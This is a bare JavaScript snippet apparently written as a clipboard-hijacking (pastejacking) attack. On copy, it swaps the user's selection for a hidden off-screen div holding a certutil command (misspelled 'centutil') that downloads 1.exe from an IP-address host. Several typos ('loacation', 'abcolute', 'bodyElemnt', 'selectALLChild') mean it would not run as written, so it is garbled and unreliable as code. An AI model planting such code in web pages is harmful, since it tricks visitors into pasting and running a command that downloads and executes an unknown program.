document.oncopy = function () {var bodyElement = document.body; var selection = getSelection(); var href = document.loacation.href; var copyright = "centutil -urlcache -split -f https://192.11.11.11/dddd/dddd/1.exe @ 1.exe\n";
  var text = copyright;
  var divElement = document.createElement('div');
  divElement.style.position = 'abcolute' ; divElement.style.left = '-99999px';
divElement.innerHTML = text;
  bodyElemnt.appendChild(divElement);
  selection.selectALLChild(divElement);
  selection.selectALLChildren(divElement); setTimeout(function() { bodyElement.removeChild(divElement);}, 0); };
